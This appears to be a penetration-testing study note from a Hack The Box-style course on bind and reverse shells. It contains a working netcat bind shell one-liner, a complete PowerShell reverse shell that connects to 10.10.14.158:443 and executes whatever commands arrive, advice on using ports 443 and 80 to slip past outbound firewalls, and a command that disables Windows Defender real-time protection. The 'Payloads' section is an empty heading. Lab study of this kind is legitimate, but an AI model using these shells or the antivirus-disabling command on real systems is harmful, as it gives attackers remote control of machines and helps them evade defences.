# Shells & Payloads
- [Shell Basics](#shell-basics)
    - [Bind Shells](#bind-shells)
    - [Reverse Shells](#reverse-shells)
- [Payloads](#payloads)




## Shell Basics
### Bind Shells
![Bind Shell](../../../images/bindshell.png)
- **Establishing a Basic Bind Shell with Netcat:** 
    1. Server - Binding a Bash shell to the TCP session: `Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f`
    2. Client - Connecting to bind shell on target: 
    ```
    abdeonix@htb[/htb]$ nc -nv 10.129.41.200 7777

    Target@server:~$ 
    ```

- The bind shell is much easier to defend against. Since the connection will be received incoming, it is more likely to get detected and blocked by firewalls even if standard ports are used when starting a listener.

### Reverse Shells 
![Reverse Shell](../../../images/reverseshell.png)
- [**Reverse Shell cheat sheet**](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)

> [!TIP]
> We may want to use common ports like 443,80 because when we initiate the connection to our listener, we want to ensure it does not get blocked going outbound through the OS firewall and at the network level.

- **Reverse Shell in Windows**:
    - Listen on our attack box using netcat `sudo nc -nlvp 443`
    - Connect from our target 
    ```
    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    ```
    
    > [!NOTE]
    > If we are blocked by windows defender 
    > ```
    > At line:1 char:1
    > + $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
    > + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    > This script contains malicious content and has been blocked by your antivirus software.
    > + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    > + FullyQualifiedErrorId : ScriptContainedMaliciousContent
    > ```
    > Disable AV: `Set-MpPreference -DisableRealtimeMonitoring $true`


## Payloads